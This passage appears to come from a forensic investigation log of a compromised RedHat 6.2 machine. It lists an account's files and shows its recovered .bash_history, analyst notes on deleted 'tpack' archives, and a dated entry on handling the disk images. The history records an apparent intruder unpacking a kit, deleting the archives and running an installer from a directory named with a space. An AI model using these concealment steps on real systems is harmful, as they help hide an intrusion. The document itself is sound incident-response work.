+-rw-r--r--   1 500      500           124 Nov  5 01:05 .bashrc
+-rw-r--r--   1 500      500           230 Nov  5 01:05 .bash_profile
+-rw-r--r--   1 500      500            24 Nov  5 01:05 .bash_logout
+drwxr-xr-x   6 0        0            4096 Nov  5 01:05 ..
+-rw-------   1 500      500            52 Nov  8 14:59 .bash_history
+drwx------   2 500      500          4096 Nov  8 14:59 .
+	# strings ./drosen/.bash_history
+gunzip *
+tar -xvf *
+rm tpack*
+cd " "
+./install
+exit
+	* What's the use of the account drosen?
+	* There were some interesting activities going on in that 
+	account after the initial incitent.
+	* Look for deleted files with names like
+		tpack*.[Z|gz]
+		install
+	!!
+	
+2001-01-19 18:43:12+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Got the images and a RedHat 6.2 iso image
+	* Checked the md5 of the images.tar
+	* Unpacked and installed the different partions
+	* Decided that I'll set TZ for all times to GMT.
+	
